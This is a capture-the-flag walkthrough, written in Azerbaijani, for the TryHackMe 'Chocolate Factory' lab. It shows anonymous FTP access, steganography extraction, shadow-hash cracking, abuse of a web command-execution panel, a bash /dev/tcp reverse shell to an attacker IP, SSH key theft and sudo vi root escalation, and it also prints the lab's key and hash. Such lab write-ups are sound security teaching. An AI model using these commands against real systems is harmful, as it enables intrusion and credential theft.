# TryHackMe — Chocolate Factory Writeup (Azərbaycan dilində)

**Platforma:** TryHackMe  
**Otaq:** Chocolate Factory  
**Çətinlik:** Asan  
**Mövzu:** Charlie və Şokolad Fabriki  
**Bacarıqlar:** Nmap, FTP, Steganography, Gobuster, RCE, Reverse Shell, SSH, Privilege Escalation  
**Link:** https://tryhackme.com/room/chocolatefactory

---

## Məzmun

1. [Kəşfiyyat — Nmap Skan](#1-kəşfiyyat--nmap-skan)
2. [FTP — Anonim Giriş](#2-ftp--anonim-giriş)
3. [Steganography — gum_room.jpg](#3-steganography--gum_roomjpg)
4. [Hash Sındırma — John the Ripper](#4-hash-sındırma--john-the-ripper)
5. [Port 113 — Açar (Key) Tapma](#5-port-113--açar-key-tapma)
6. [Web — Gobuster və RCE](#6-web--gobuster-və-rce)
7. [Reverse Shell](#7-reverse-shell)
8. [SSH Private Key ilə Giriş](#8-ssh-private-key-ilə-giriş)
9. [User Flag](#9-user-flag)
10. [Privilege Escalation — Root Flag](#10-privilege-escalation--root-flag)
11. [Root.py — Final Flag](#11-rootpy--final-flag)
12. [Nəticə](#12-nəticə)

---

## 1. Kəşfiyyat — Nmap Skan

```bash
nmap -sV -sC -A <HEDEF_IP>
```

**Nəticə — Əsas portlar:**

| Port | Servis  | Qeyd                        |
|------|---------|-----------------------------|
| 21   | FTP     | vsftpd 3.0.5 — anonim giriş |
| 22   | SSH     | OpenSSH                     |
| 80   | HTTP    | Apache — login səhifəsi     |
| 113  | ident   | Burada açar gizlənib!       |

> **Qeyd:** 100–125 arası portlar da açıqdır, lakin hamısında eyni mesaj var:
> `"small hint from Mr.Wonka: Look somewhere else, its not here!"`

---

## 2. FTP — Anonim Giriş

FTP xidməti **anonim girişə** icazə verir:

```bash
ftp <HEDEF_IP>
# Username: anonymous
# Password: (boş — Enter)
```

FTP içindəki faylları gör:

```bash
ls -la
```

**`gum_room.jpg`** faylı tapılır. Yüklə:

```bash
get gum_room.jpg
exit
```

---

## 3. Steganography — gum_room.jpg

StegSeek ilə gizli məlumatı çıxart:

```bash
stegseek gum_room.jpg /usr/share/wordlists/rockyou.txt
```

**Nəticə:**
```
[i] Found passphrase: ""
[i] Original filename: "b64.txt"
[i] Extracting to "gum_room.jpg.out"
```

Məzmunu oxu:

```bash
cat gum_room.jpg.out
```

**Base64** ilə şifrələnmiş `/etc/shadow` faylının məzmunu çıxır. Deşifrə et:

```bash
base64 -d gum_room.jpg.out
```

**charlie** istifadəçisinin hash-i tapılır:

```
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0...
```

---

## 4. Hash Sındırma — John the Ripper

```bash
echo 'charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/' > hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Nəticə:** Charlie-nin şifrəsi tapılır.

---

## 5. Port 113 — Açar (Key) Tapma

Nmap çıxışında port 113-də xüsusi məlumat var. Onu `strings` ilə oxu:

```bash
# Nmap -sV çıxışında port 113-ün banner-ına bax
strings <yüklənmiş fayl>
```

**Açar tapılır:**
```
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

> Bu açar sonunda **root flag-ı** deşifrə etmək üçün lazım olacaq!

---

## 6. Web — Gobuster və RCE

Brauzer ilə `http://<HEDEF_IP>` açıldıqda **login səhifəsi** görünür.

Gizli qovluqları tap:

```bash
gobuster dir -u http://<HEDEF_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html
```

**Tapılan fayllar:**
- `/home.php` — **RCE (Remote Code Execution)** səhifəsi!
- `/validate.php`
- `/key_rev_key`

### home.php — Əmr İcra Etmək

`http://<HEDEF_IP>/home.php` səhifəsində **əmr icra etmə** paneli var.

Test et:

```bash
# Səhifədəki execute qutusuna yaz:
ls
```

**`key_rev_key`** faylı görünür. Oxu:

```bash
cat key_rev_key
```

Bu sualın cavabı olan **açarı** verir.

---

## 7. Reverse Shell

Kali-də dinlə:

```bash
nc -lvnp 4444
```

`home.php` səhifəsindəki əmr qutusuna yaz:

```bash
bash -c 'exec bash -i &> /dev/tcp/<KALI_IP>/4444 <&1'
```

**Shell əldə edildi!**

Shell-i stabilləşdir:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
Ctrl + Z
stty raw -echo; fg
export TERM=xterm
```

### validate.php — Şifrəni Tap

```bash
cat /var/www/html/validate.php
```

Charlie-nin şifrəsi burada açıq yazılıb.

---

## 8. SSH Private Key ilə Giriş

Shell içindən Charlie-nin SSH private key-ini tap:

```bash
ls /home/charlie/
# teleport  teleport.pub  user.txt
cat /home/charlie/teleport
```

Key-i Kali-yə kopyala:

```bash
# Kali-də:
nano charlie_id_rsa
# İçini yapışdır

chmod 600 charlie_id_rsa
ssh -i charlie_id_rsa charlie@<HEDEF_IP>
```

Şifrəsiz SSH girişi uğurlu olur!

---

## 9. User Flag

```bash
cat /home/charlie/user.txt
```

**User flag əldə edildi!**

---

## 10. Privilege Escalation — Root Flag

```bash
sudo -l
```

**Nəticə:**
```
(ALL : !root) NOPASSWD: /usr/bin/vi
```

### VI ilə Root Shell

**GTFOBins** metodunu istifadə et:

```bash
sudo vi -c ':!/bin/sh' /dev/null
```

**Root shell əldə edildi!**

```bash
whoami
# root
```

---

## 11. Root.py — Final Flag

Root qovluğunda Python skripti var:

```bash
ls /root/
# root.py
```

Skripti işlət:

```bash
python3 /root/root.py
```

**Açar soruşulur** — port 113-dən tapdığımız açarı daxil et:

```
Enter the key: b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

**Nəticə:**
```
You Are Now The Owner Of Chocolate Factory !!
```

**Root flag əldə edildi!**

---

## 12. Nəticə

### İstifadə edilən texnikalar

| Addım                  | Alət / Metod                     |
|------------------------|----------------------------------|
| Port skanı             | Nmap                             |
| FTP anonim giriş       | ftp anonymous                    |
| Steganography          | StegSeek                         |
| Base64 deşifrə         | base64 -d                        |
| Hash sındırma          | John the Ripper                  |
| Açar tapma             | Nmap port 113 / strings          |
| Qovluq axtarışı        | Gobuster                         |
| RCE                    | home.php execute paneli          |
| Reverse Shell          | bash -c exec + Netcat            |
| Shell stabilləşdirmə   | Python3 pty                      |
| SSH giriş              | Private key (teleport)           |
| Privilege Escalation   | sudo vi → GTFOBins               |
| Root flag              | root.py + Fernet şifrəsi         |

### Əldə edilən flaglar

- **Key (Açar):** Port 113 / `key_rev_key` faylından
- **User flag:** `/home/charlie/user.txt`
- **Root flag:** `/root/root.py` skriptini açarla işlətməklə

### Öyrənilənlər

- FTP anonim girişə həmişə yoxla — həssas fayllar ola bilər.
- Şəkil fayllarında steganography ilə gizli məlumat ola bilər.
- Web panellərindəki `execute` funksiyaları **RCE** zəifliyidir.
- SSH private key-lər düzgün qorunmalıdır — `/home` qovluğunda açıq saxlamaq təhlükəlidir.
- `sudo vi` → GTFOBins ilə asanlıqla root alınır.
- Fernet simmetrik şifrələmə — açar olmadan deşifrə etmək mümkün deyil.

---

*Writeup müəllifi: CTF həvəskarı*  
*Tarix: 2026*
